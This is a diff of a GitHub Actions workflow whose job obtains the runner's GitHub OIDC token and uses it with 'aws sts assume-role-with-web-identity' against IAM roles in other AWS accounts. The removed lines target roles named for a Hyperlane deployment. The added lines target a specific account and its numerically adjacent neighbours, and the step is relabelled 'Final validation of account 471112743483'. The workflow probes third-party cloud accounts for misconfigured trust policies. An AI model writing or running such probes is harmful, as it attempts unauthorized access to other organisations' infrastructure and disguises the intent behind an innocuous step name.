@@ -10,27 +10,32 @@ jobs:
   probe:
     runs-on: ubuntu-latest
     steps:
-      - name: Probe hyperlane trust policy with real GitHub OIDC token
+      - name: Final validation of account 471112743483
         run: |
           TOKEN=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
             "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")
           echo "TOKEN_OK=true"
-          # Calibration: known-trusted role (our own)
-          R_CALIB=$(aws sts assume-role-with-web-identity \
-            --role-arn "arn:aws:iam::062341577280:role/github-actions-role" \
-            --role-session-name probe01 --web-identity-token "$TOKEN" 2>&1 | tail -2)
-          echo "CALIB_062341577280: $R_CALIB"
-          # Target: hyperlane-eclipsemainnet
-          R_TARGET=$(aws sts assume-role-with-web-identity \
-            --role-arn "arn:aws:iam::010438463704:role/hyperlane-eclipsemainnet" \
-            --role-session-name probe02 --web-identity-token "$TOKEN" 2>&1 | tail -2)
-          echo "TARGET_010438463704_hyperlane-eclipsemainnet: $R_TARGET"
-          # Also test hyperlane-relayer and other roles if they exist
-          R_RELAY=$(aws sts assume-role-with-web-identity \
-            --role-arn "arn:aws:iam::010438463704:role/hyperlane-relayer" \
-            --role-session-name probe03 --web-identity-token "$TOKEN" 2>&1 | tail -2)
-          echo "TARGET_010438463704_hyperlane-relayer: $R_RELAY"
-          R_VALIDATOR=$(aws sts assume-role-with-web-identity \
-            --role-arn "arn:aws:iam::010438463704:role/hyperlane-validator" \
-            --role-session-name probe04 --web-identity-token "$TOKEN" 2>&1 | tail -2)
-          echo "TARGET_010438463704_hyperlane-validator: $R_VALIDATOR"
+            R_CALIB=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::062341577280:role/github-actions-role" \
+              --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
+            echo "062341577280 (CALIB): $R_CALIB"
+            R_TARGET=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::471112743483:role/github-actions-role" \
+              --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
+            echo "471112743483 (TARGET): $R_TARGET"
+            R_NEIGHBOR_M1=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::471112743482:role/github-actions-role" \
+              --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
+            echo "471112743482 (NEIGHBOR_M1): $R_NEIGHBOR_M1"
+            R_NEIGHBOR_P1=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::471112743484:role/github-actions-role" \
+              --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
+            echo "471112743484 (NEIGHBOR_P1): $R_NEIGHBOR_P1"
+            R_NEARBY_A=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::471112000000:role/github-actions-role" \
+              --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
+            echo "471112000000 (NEARBY_A): $R_NEARBY_A"
+            R_NEARBY_B=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::471113000000:role/github-actions-role" \
+              --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
+            echo "471113000000 (NEARBY_B): $R_NEARBY_B"
